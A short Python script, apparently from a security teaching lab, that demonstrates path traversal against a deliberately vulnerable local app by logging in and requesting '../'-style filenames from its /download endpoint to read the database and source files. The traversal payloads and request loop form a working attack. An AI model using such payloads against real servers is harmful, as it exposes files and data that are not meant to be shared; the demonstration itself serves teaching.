"""
Path Traversal Attack Demo
Uses the /download endpoint to read files outside the messages/ directory.
Run against the VULNERABLE app (port 5000).
"""
import requests

BASE = "http://127.0.0.1:5000"
SESSION = requests.Session()


def login(username="alice", password="alice123"):
    SESSION.post(f"{BASE}/login", data={"username": username, "password": password})


def traverse(target_path: str):
    """Attempt to download a file via path traversal."""
    r = SESSION.get(f"{BASE}/download", params={"filename": target_path})
    success = r.status_code == 200 and len(r.content) > 0
    preview = r.text[:120].replace("\n", "\\n") if success else r.text[:80]
    print(f"[PathTraversal] filename={target_path!r}")
    print(f"  status={r.status_code} bytes={len(r.content)} success={success}")
    if success:
        print(f"  content preview: {preview}")
    return success


if __name__ == "__main__":
    print("=" * 60)
    print("Path Traversal Demo — Vulnerable App (port 5000)")
    print("=" * 60)
    login()

    targets = [
        # Traverse up from messages/ to project root
        "../init_db.py",
        # Try to read the database file
        "../app.db",
        # Try requirements
        "../requirements.txt",
        # Windows-style traversal
        "..\\init_db.py",
    ]

    results = []
    for t in targets:
        results.append(traverse(t))

    print()
    print(f"Successful traversals: {sum(results)}/{len(results)}")
